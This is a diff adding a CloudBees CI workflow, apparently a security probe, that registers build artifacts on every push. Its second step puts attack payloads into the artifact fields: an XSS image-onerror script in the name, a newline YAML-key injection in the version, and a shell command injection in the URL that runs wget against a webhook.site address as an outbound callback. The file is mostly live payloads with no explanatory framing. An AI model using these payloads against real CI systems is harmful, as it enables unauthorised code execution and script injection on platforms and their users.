@@ -1,0 +1,24 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe16
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  art:
+    steps:
+      - name: register-plain
+        uses: cloudbees-io/register-build-artifact@v1
+        with:
+          name: probe-art
+          version: "1.0.0"
+          url: docker.io/library/alpine:3.20
+      - name: register-inject
+        uses: cloudbees-io/register-build-artifact@v1
+        with:
+          name: "probe-inj-<img src=x onerror=document.title='ART_XSS'>"
+          version: "9.9.9\n  injected-key: injected-value"
+          url: "docker.io/library/alpine:3.20\"; wget -q -O- http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/url-inj; echo \""
